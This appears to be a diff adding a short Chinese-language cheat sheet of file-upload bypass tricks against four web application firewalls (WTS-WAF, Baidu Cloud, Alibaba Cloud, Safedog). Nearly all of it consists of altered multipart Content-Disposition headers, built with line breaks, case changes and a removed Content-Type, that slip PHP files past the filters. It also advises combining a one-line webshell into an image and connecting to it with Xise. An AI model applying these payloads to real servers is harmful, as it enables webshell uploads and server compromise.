@@ -1,0 +1,23 @@
+1：WTS-WAF 绕过上传
+原内容：
+Content-Disposition: form-data; name="up_picture"; filename="xss.php"
+添加回车
+Content-Disposition: form-data; name="up_picture"; filename="xss.ph
+p"
+
+2：百度云上传绕过见下：
+百度云绕过就简单的很多很多，在对文件名大小写上面没有检测php是过了的，Php就能过，或者PHP，一句话自己合成图片马用Xise连接即可。
+Content-Disposition: form-data; name="up_picture"; filename="xss.jpg .Php"
+3：阿里云上传绕过见下：
+源代码：
+Content-Disposition: form-data; name="img_crop_file"; filename="1.jpg .Php"Content-Type: image/jpeg
+修改如下：
+Content-Disposition: form-data; name="img_crop_file"; filename="1.php"
+没错，将=号这里回车删除掉Content-Type: image/jpeg即可绕过。
+4：安全狗上传绕过见下：
+源代码:
+Content-Disposition: form-data; name="image"; filename="085733uykwusqcs8vw8wky.png"Content-Type: image/png
+绕过内容如下：
+Content-Disposition: form-data; name="image"; filename="085733uykwusqcs8vw8wky.png
+C.php"
+删除掉ontent-Type: image/jpeg只留下c，将.php加c后面即可，但是要注意额，双引号要跟着c.php".
